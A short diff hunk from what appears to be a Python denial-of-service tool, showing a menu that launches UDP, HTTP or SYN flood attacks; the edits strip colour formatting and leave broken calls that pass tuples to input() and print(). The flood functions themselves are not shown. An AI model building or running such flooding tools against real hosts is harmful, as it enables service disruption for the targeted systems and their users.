@@ -182,16 +182,16 @@ def http_flood(ip, port, duration):
 
 
 # Prompt for the type of attack
-attack_type = input(colored(
+attack_type = input((
     "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))
 
 if attack_type == "1":
     message = b"Sending 1337 packets baby"
-    print(colored("UDP attack selected", "red"))
+    print(("UDP attack selected", "red"))
     udp_flood(ip, port, message, dur)
-    print(colored("UDP attack completed", "red"))
+    print(("UDP attack completed", "red"))
 elif attack_type == "3":
-    print(colored("SYN attack selected", "red"))
+    print(("SYN attack selected", "red"))
     syn_flood(ip, port, dur)
 elif attack_type == "2":
     print(colored("HTTP attack selected", "red"))
